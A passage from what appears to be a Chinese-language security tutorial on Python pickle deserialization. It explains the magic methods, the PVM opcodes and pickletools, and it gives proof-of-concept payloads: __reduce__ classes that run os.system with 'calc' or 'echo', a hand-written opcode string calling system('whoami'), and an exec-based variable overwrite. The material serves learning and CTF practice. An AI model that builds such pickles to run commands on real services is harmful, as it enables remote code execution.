<pre><code class="hljs plaintext">在进行pickle.dumps时，会尝试调用reduce方法以获取序列化信息，因此会执行print函数。但在此阶段，其并不会执行返回的可调用对象和其他参数，只是单纯的获取这些信息用于后续的反序列化操作。</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213184943131.png" alt="image-20231213184943131"></p>
<p>这里有一个注意点，就是reduce的return部分，是必须要返回一个字符串或者是元组的，否则就会报错，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213191007068.png" alt="image-20231213191007068"></p>
<p>不过一个懵逼的点是，我将上述os.system后面的逗号去掉之后，虽然报错，但依旧执行了calc命令。。。暂不清楚原因。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213191208937.png" alt="image-20231213191208937"></p>
<h3 id="__setstate__"><code>__setstate__()</code></h3>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span>():
    <span class="hljs-comment"># 构造函数的定义</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):
        self.name = name
    <span class="hljs-comment"># 构造 __setstate__ 方法</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setstate__</span>(<span class="hljs-params">self, name</span>):
        os.system(<span class="hljs-string">'calc'</span>)  <span class="hljs-comment"># 恶意代码</span>
tmp = pickle.dumps(SerializePerson(<span class="hljs-string">'tom'</span>))  <span class="hljs-comment">#序列化</span>
pickle.loads(tmp)  <span class="hljs-comment"># 反序列化 此时会弹出计算器</span></code></pre>
<p>这里在反序列化时会自动调用<code>__setstate__</code>魔术方法，进而执行calc命令，如下图成功验证，但此函数的优先级低于reduce，且是静态方法。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213190504610.png" alt="image-20231213190504610"></p>
<h3 id="__getstate__"><code>__getstate__()</code></h3>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os

<span class="hljs-comment">#序列化魔术方法调用-__getstate__</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getstate__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'序列化调用'</span>)
        os.system(<span class="hljs-string">'calc'</span>)
a = A()
p_a = pickle.dumps(a)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=========='</span>)
<span class="hljs-built_in">print</span>(p_a)</code></pre>
<p>该函数会在序列化时自动调用，如下图成功验证</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213190847225.png" alt="image-20231213190847225"></p>
<h2 id="35-简单使用">3.5 简单使用</h2>
<h3 id="351-序列化操作">3.5.1 序列化操作</h3>
<p>代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>():
	<span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">self, name=<span class="hljs-string">'h3rmesk1t'</span></span>):
		self.name = name

<span class="hljs-built_in">print</span>(pickle.dumps(Demo()))</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213184250405.png" alt="image-20231213184250405"></p>
<p>在Python2与Python3下的运行结果如上图所示</p>
<p>输出的一大串字符实际上是一串<code>PVM</code>操作码，可以在<code>pickle.py</code>中看到关于这些操作码的详解.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231114192022665.png" alt="image-20231114192022665"></p>
<h3 id="352-反序列化操作">3.5.2 反序列化操作</h3>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>():
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-string">'h3rmesk1t'</span></span>):
        self.name = name

<span class="hljs-built_in">print</span>(<span class="hljs-string">'[+] 序列化'</span>)
<span class="hljs-built_in">print</span>(pickle.dumps(Demo()))
<span class="hljs-built_in">print</span>(<span class="hljs-string">'[+] 反序列化'</span>)
<span class="hljs-built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231114192206885.png" alt="image-20231114192206885"></p>
<h1 id="0x04-pickle过程详细解读">0x04 Pickle过程详细解读</h1>
<ul>
<li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li>
<li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li>
<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
<li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
</ul>
<p>为了便于理解，hachp1师傅把BH讲稿中的相关部分制成了动图，PVM解析 <code>str</code> 的过程动图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="20200320230631-6204866e-6abc-1-1699962626606-3.gif" alt="20200320230631-6204866e-6abc-1"></p>
<ul>
<li>PVM解析 <code>__reduce__()</code> 的过程动图：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
<h2 id="41-执行流程">4.1 执行流程</h2>
<p>首先, <code>PVM</code>会把源代码编译成字节码, 字节码是<code>Python</code>语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果<code>Python</code>进程在主机上有写入权限, 那么它会把程序字节码保存为一个以<code>.pyc</code>为扩展名的文件. 如果没有写入权限, 则<code>Python</code>进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.</p>
<p>一般来说, 在构建程序时最好给<code>Python</code>进程在主机上的写入权限, 这样只要源代码没有改变, 生成的<code>.pyc</code>文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.</p>
<p>然后, <code>Python</code>进程会把编译好的字节码转发到<code>PVM</code>(<code>Python</code>虚拟机)中, <code>PVM</code>会循环迭代执行字节码指令, 直到所有操作被完成.</p>
<h2 id="42-opcode简介">4.2 opcode简介</h2>
<ul>
<li>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。</li>
</ul>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle

a={<span class="hljs-string">'1'</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>: <span class="hljs-number">2</span>}

<span class="hljs-built_in">print</span>(<span class="hljs-string">f'# 原变量：<span class="hljs-subst">{a!r}</span>'</span>)<span class="hljs-comment"># 输出a的值</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'pickle版本<span class="hljs-subst">{i}</span>'</span>,pickle.dumps(a,protocol=i))

<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 原变量:{'1': 1, '2': 2}</span>
Pcike版本<span class="hljs-number">0</span> <span class="hljs-string">b'(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.'</span>
Pcike版本<span class="hljs-number">1</span> <span class="hljs-string">b'}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span>
Pcike版本<span class="hljs-number">2</span> <span class="hljs-string">b'\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span>
Pcike版本<span class="hljs-number">3</span> <span class="hljs-string">b'\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></code></pre>
<ul>
<li>pickle3版本的opcode示例：</li>
</ul>
<pre><code class="hljs py"><span class="hljs-comment"># 'abcd'</span>
<span class="hljs-string">b'\x80\x03X\x04\x00\x00\x00abcdq\x00.'</span>

<span class="hljs-comment"># \x80：协议头声明 </span>
<span class="hljs-comment"># \x03：协议版本</span>
<span class="hljs-comment"># \x04\x00\x00\x00：数据长度：4</span>
<span class="hljs-comment"># abcd：数据</span>
<span class="hljs-comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span>
<span class="hljs-comment"># \x00：栈顶位置</span>
<span class="hljs-comment"># .：数据截止</span></code></pre>
<ul>
<li>pickle0版本的部分opcode表格：</li>
</ul>
<table>
<thead>
<tr>
<th>Opcode</th>
<th>Mnemonic</th>
<th>Data type loaded onto the stack</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>S</td>
<td>STRING</td>
<td>String</td>
<td>S’foo’\n</td>
</tr>
<tr>
<td>V</td>
<td>UNICODE</td>
<td>Unicode</td>
<td>Vfo\u006f\n</td>
</tr>
<tr>
<td>I</td>
<td>INTEGER</td>
<td>Integer</td>
<td>I42\n</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
</tbody>
</table>
<ul>
<li>本表格截取了BH的pdf上的部分内容，完整表格可以直接在<a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">原pdf</a>中找到。</li>
</ul>
<h2 id="43-指令集">4.3 指令集</h2>
<p>当前用于<code>pickling</code>的协议共有<code>6</code>种, 使用的协议版本越高, 读取生成的<code>pickle</code>所需的<code>Python</code>版本就要越新.</p>
<ul>
<li><code>v0</code>版协议是原始的"人类可读"协议, 并且向后兼容早期版本的<code>Python</code>.</li>
<li><code>v1</code>版协议是较早的二进制格式, 它也与早期版本的<code>Python</code>兼容.</li>
<li><code>v2</code>版协议是在<code>Python 2.3</code>中引入的, 它为存储<code>new-style class</code>提供了更高效的机制, 参阅<code>PEP 307</code>.</li>
<li><code>v3</code>版协议添加于<code>Python 3.0</code>, 它具有对<code>bytes</code>对象的显式支持, 且无法被<code>Python 2.x</code>打开, 这是目前默认使用的协议, 也是在要求与其他<code>Python 3</code>版本兼容时的推荐协议.</li>
<li><code>v4</code>版协议添加于<code>Python 3.4</code>, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅<code>PEP 3154</code>.</li>
<li><code>v5</code>版协议添加于<code>Python 3.8</code>, 它支持带外数据, 加速带内数据处理.</li>
</ul>
<pre><code class="hljs py"><span class="hljs-comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
<span class="hljs-comment"># here is in kind-of alphabetical order of 1-character pickle code.</span>
<span class="hljs-comment"># pickletools groups them by purpose.</span>

MARK           = <span class="hljs-string">b'('</span>   <span class="hljs-comment"># push special markobject on stack</span>
STOP           = <span class="hljs-string">b'.'</span>   <span class="hljs-comment"># every pickle ends with STOP</span>
POP            = <span class="hljs-string">b'0'</span>   <span class="hljs-comment"># discard topmost stack item</span>
POP_MARK       = <span class="hljs-string">b'1'</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span>
DUP            = <span class="hljs-string">b'2'</span>   <span class="hljs-comment"># duplicate top stack item</span>
FLOAT          = <span class="hljs-string">b'F'</span>   <span class="hljs-comment"># push float object; decimal string argument</span>
INT            = <span class="hljs-string">b'I'</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span>
BININT         = <span class="hljs-string">b'J'</span>   <span class="hljs-comment"># push four-byte signed int</span>
BININT1        = <span class="hljs-string">b'K'</span>   <span class="hljs-comment"># push 1-byte unsigned int</span>
LONG           = <span class="hljs-string">b'L'</span>   <span class="hljs-comment"># push long; decimal string argument</span>
BININT2        = <span class="hljs-string">b'M'</span>   <span class="hljs-comment"># push 2-byte unsigned int</span>
NONE           = <span class="hljs-string">b'N'</span>   <span class="hljs-comment"># push None</span>
PERSID         = <span class="hljs-string">b'P'</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span>
BINPERSID      = <span class="hljs-string">b'Q'</span>   <span class="hljs-comment">#  "       "         "  ;  "  "   "     "  stack</span>
REDUCE         = <span class="hljs-string">b'R'</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span>
STRING         = <span class="hljs-string">b'S'</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span>
BINSTRING      = <span class="hljs-string">b'T'</span>   <span class="hljs-comment"># push string; counted binary string argument</span>
SHORT_BINSTRING= <span class="hljs-string">b'U'</span>   <span class="hljs-comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
UNICODE        = <span class="hljs-string">b'V'</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped'd argument</span>
BINUNICODE     = <span class="hljs-string">b'X'</span>   <span class="hljs-comment">#   "     "       "  ; counted UTF-8 string argument</span>
APPEND         = <span class="hljs-string">b'a'</span>   <span class="hljs-comment"># append stack top to list below it</span>
BUILD          = <span class="hljs-string">b'b'</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span>
GLOBAL         = <span class="hljs-string">b'c'</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span>
DICT           = <span class="hljs-string">b'd'</span>   <span class="hljs-comment"># build a dict from stack items</span>
EMPTY_DICT     = <span class="hljs-string">b'}'</span>   <span class="hljs-comment"># push empty dict</span>
APPENDS        = <span class="hljs-string">b'e'</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span>
GET            = <span class="hljs-string">b'g'</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span>
BINGET         = <span class="hljs-string">b'h'</span>   <span class="hljs-comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>
INST           = <span class="hljs-string">b'i'</span>   <span class="hljs-comment"># build &amp; push class instance</span>
LONG_BINGET    = <span class="hljs-string">b'j'</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span>
LIST           = <span class="hljs-string">b'l'</span>   <span class="hljs-comment"># build list from topmost stack items</span>
EMPTY_LIST     = <span class="hljs-string">b']'</span>   <span class="hljs-comment"># push empty list</span>
OBJ            = <span class="hljs-string">b'o'</span>   <span class="hljs-comment"># build &amp; push class instance</span>
PUT            = <span class="hljs-string">b'p'</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span>
BINPUT         = <span class="hljs-string">b'q'</span>   <span class="hljs-comment">#   "     "    "   "   " ;   "    " 1-byte arg</span>
LONG_BINPUT    = <span class="hljs-string">b'r'</span>   <span class="hljs-comment">#   "     "    "   "   " ;   "    " 4-byte arg</span>
SETITEM        = <span class="hljs-string">b's'</span>   <span class="hljs-comment"># add key+value pair to dict</span>
TUPLE          = <span class="hljs-string">b't'</span>   <span class="hljs-comment"># build tuple from topmost stack items</span>
EMPTY_TUPLE    = <span class="hljs-string">b')'</span>   <span class="hljs-comment"># push empty tuple</span>
SETITEMS       = <span class="hljs-string">b'u'</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span>
BINFLOAT       = <span class="hljs-string">b'G'</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span>

TRUE           = <span class="hljs-string">b'I01\n'</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span>
FALSE          = <span class="hljs-string">b'I00\n'</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span>

<span class="hljs-comment"># Protocol 2</span>

PROTO          = <span class="hljs-string">b'\x80'</span>  <span class="hljs-comment"># identify pickle protocol</span>
NEWOBJ         = <span class="hljs-string">b'\x81'</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span>
EXT1           = <span class="hljs-string">b'\x82'</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span>
EXT2           = <span class="hljs-string">b'\x83'</span>  <span class="hljs-comment"># ditto, but 2-byte index</span>
EXT4           = <span class="hljs-string">b'\x84'</span>  <span class="hljs-comment"># ditto, but 4-byte index</span>
TUPLE1         = <span class="hljs-string">b'\x85'</span>  <span class="hljs-comment"># build 1-tuple from stack top</span>
TUPLE2         = <span class="hljs-string">b'\x86'</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span>
TUPLE3         = <span class="hljs-string">b'\x87'</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span>
NEWTRUE        = <span class="hljs-string">b'\x88'</span>  <span class="hljs-comment"># push True</span>
NEWFALSE       = <span class="hljs-string">b'\x89'</span>  <span class="hljs-comment"># push False</span>
LONG1          = <span class="hljs-string">b'\x8a'</span>  <span class="hljs-comment"># push long from &lt; 256 bytes</span>
LONG4          = <span class="hljs-string">b'\x8b'</span>  <span class="hljs-comment"># push really big long</span>

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

<span class="hljs-comment"># Protocol 3 (Python 3.x)</span>

BINBYTES       = <span class="hljs-string">b'B'</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span>
SHORT_BINBYTES = <span class="hljs-string">b'C'</span>   <span class="hljs-comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>

<span class="hljs-comment"># Protocol 4</span>

SHORT_BINUNICODE = <span class="hljs-string">b'\x8c'</span>  <span class="hljs-comment"># push short string; UTF-8 length &lt; 256 bytes</span>
BINUNICODE8      = <span class="hljs-string">b'\x8d'</span>  <span class="hljs-comment"># push very long string</span>
BINBYTES8        = <span class="hljs-string">b'\x8e'</span>  <span class="hljs-comment"># push very long bytes string</span>
EMPTY_SET        = <span class="hljs-string">b'\x8f'</span>  <span class="hljs-comment"># push empty set on the stack</span>
ADDITEMS         = <span class="hljs-string">b'\x90'</span>  <span class="hljs-comment"># modify set by adding topmost stack items</span>
FROZENSET        = <span class="hljs-string">b'\x91'</span>  <span class="hljs-comment"># build frozenset from topmost stack items</span>
NEWOBJ_EX        = <span class="hljs-string">b'\x92'</span>  <span class="hljs-comment"># like NEWOBJ but work with keyword only arguments</span>
STACK_GLOBAL     = <span class="hljs-string">b'\x93'</span>  <span class="hljs-comment"># same as GLOBAL but using names on the stacks</span>
MEMOIZE          = <span class="hljs-string">b'\x94'</span>  <span class="hljs-comment"># store top of the stack in memo</span>
FRAME            = <span class="hljs-string">b'\x95'</span>  <span class="hljs-comment"># indicate the beginning of a new frame</span>

<span class="hljs-comment"># Protocol 5</span>

BYTEARRAY8       = <span class="hljs-string">b'\x96'</span>  <span class="hljs-comment"># push bytearray</span>
NEXT_BUFFER      = <span class="hljs-string">b'\x97'</span>  <span class="hljs-comment"># push next out-of-band buffer</span>
READONLY_BUFFER  = <span class="hljs-string">b'\x98'</span>  <span class="hljs-comment"># make top of stack readonly</span></code></pre>
<p>上文谈到了<code>opcode</code>是有多个版本的, 在进行序列化时可以通过<code>protocol=num</code>来选择<code>opcode</code>的版本, 指定的版本必须小于等于<code>5</code>.</p>
<h2 id="44-pickletools">4.4 Pickletools</h2>
<ul>
<li>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</li>
</ul>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickletools

data=<span class="hljs-string">b"\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b'1'\nkey2=b'2'q\x01\x85q\x02Rq\x03."</span>
pickletools.dis(data)

    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'builtins exec'</span>
   <span class="hljs-number">17</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">19</span>: X    BINUNICODE <span class="hljs-string">"key1=b'1'\nkey2=b'2'"</span>
   <span class="hljs-number">43</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">45</span>: \x85 TUPLE1
   <span class="hljs-number">46</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">48</span>: R    REDUCE
   <span class="hljs-number">49</span>: q    BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-number">51</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">2</span></code></pre>
<h2 id="45-例子-文字说明">4.5 例子-文字说明</h2>
<p>这里翻到其他文章采用了文字叙述的方式介绍了一个简单的opcode例子：</p>
<p>这里用一段简短的字节码来演示利用过程:</p>
<pre><code class="hljs py">cos
system
(S<span class="hljs-string">'whoami'</span>
tR.</code></pre>
<p>上文中的字节码其实就是<code>__import__('os').system(*('whoami',))</code>, 下面来分解分析一下:</p>
<pre><code class="hljs py">cos         =&gt;  引入模块 os.
system      =&gt;  引用 system, 并将其添加到 stack.
(S<span class="hljs-string">'whoami'</span>  =&gt;  把当前 stack 存到 metastack, 清空 stack, 再将 <span class="hljs-string">'whoami'</span> 压入 stack.
t           =&gt;  stack 中的值弹出并转为 <span class="hljs-built_in">tuple</span>, 把 metastack 还原到 stack, 再将 <span class="hljs-built_in">tuple</span> 压入 stack.
R           =&gt;  system(*(<span class="hljs-string">'whoami'</span>,)).
.           =&gt;  结束并返回当前栈顶元素.</code></pre>
<p>需要注意的是, 并不是所有的对象都能使用<code>pickle</code>进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以.</p>
<h1 id="0x05-漏洞利用">0x05 漏洞利用</h1>
<h2 id="51-漏洞原理">5.1 漏洞原理</h2>
<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化，反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码.</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20220324162032-45c29bc2-ab4b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116204056120.png" alt="image-20231116204056120"></a></p>
<p>简单来说, <code>__reduce__()</code>魔术方法类似于<code>PHP</code>中的<code>__wakeup()</code>方法, 在反序列化时会先调用<code>__reduce__()</code>魔术方法.</p>
<pre><code class="hljs plaintext">1.如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回.
2.如果返回值是一个元组, 要求是2到6个参数(Python3.8新加入元组的第六项).
	i.第一个参数是可调用的对象.
	ii.第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.
	iii.第三个是用于表示对象的状态的可选元素, 将被传给前述的__setstate__()方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至__dict__属性中.
	iv.第四个是用于返回连续项的迭代器的可选元素.
	v.第五个是用于返回连续键值对的迭代器的可选元素.
	vi.第六个是一个带有(obj, state)签名的可调用对象的可选元素.</code></pre>
<p>这里依旧展示一下小迪的Demo，浅浅了解Python反序列化漏洞的为何会产生</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os

<span class="hljs-comment">#反序列化安全漏洞产生-DEMO</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-comment"># 定义构造函数，将传入的参数进行了赋值</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, func, arg</span>):
        self.func = func
        self.arg = arg
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'This is A'</span>)
    <span class="hljs-comment"># 定义reduce方法，这里将传入的参数分别当做了函数及参数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'反序列化调用'</span>)
        <span class="hljs-keyword">return</span> (self.func, self.arg)
a = A(os.system, (<span class="hljs-string">'calc'</span>,))
p_a = pickle.dumps(a)
pickle.loads(p_a)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=========='</span>)
<span class="hljs-built_in">print</span>(p_a)</code></pre>
<p>很明显如果我们此时运行程序的话，就会执行calc命令，这也就是说我们可以传入一些带恶意数据的序列化字符串，将其传入到某个具有反序列化功能的点，那就会执行我们的恶意数据，可以进一步开展后续工作了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213191517323.png" alt="image-20231213191517323"></p>
<h2 id="52-利用思路">5.2 利用思路</h2>
<ul>
<li>任意代码执行或命令执行。</li>
<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
</ul>
<h2 id="53-初步认识pickle-exp的简单demo">5.3 初步认识：pickle EXP的简单demo</h2>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        s = <span class="hljs-string">"""echo test &gt;poc.txt"""</span>  <span class="hljs-comment"># 要执行的命令</span>
        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduce函数必须返回元组或字符串</span>

e = genpoc()
poc = pickle.dumps(e)

<span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></code></pre>
<ul>
<li>变量覆盖</li>
</ul>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle

key1 = <span class="hljs-string">b'321'</span>
key2 = <span class="hljs-string">b'123'</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">"key1=b'1'\nkey2=b'2'"</span>,))

a = A()
pickle_a = pickle.dumps(a)
<span class="hljs-built_in">print</span>(pickle_a)
pickle.loads(pickle_a)
<span class="hljs-built_in">print</span>(key1, key2)</code></pre>
<p>输出：</p>
<pre><code class="hljs py"><span class="hljs-string">b"\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x13key1=b'1'\nkey2=b'2'\x94\x85\x94R\x94."</span>
<span class="hljs-string">b'1'</span> <span class="hljs-string">b'2'</span></code></pre>
<h2 id="54-如何手写opcode">5.4 如何手写opcode</h2>
<ul>
<li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。</li>
</ul>
<h3 id="541-常用opcode解析">5.4.1 常用opcode解析</h3>
<p>为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
<p>由于pickle库中的注释不是很详细，网上的其他资料也没有具体地把栈和memo上的变化讲清楚，以下的每个opcode的操作都是hachp1师傅经过实验验证并且尽可能将栈和memo上的变化解释清楚，常用的opcode如下：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
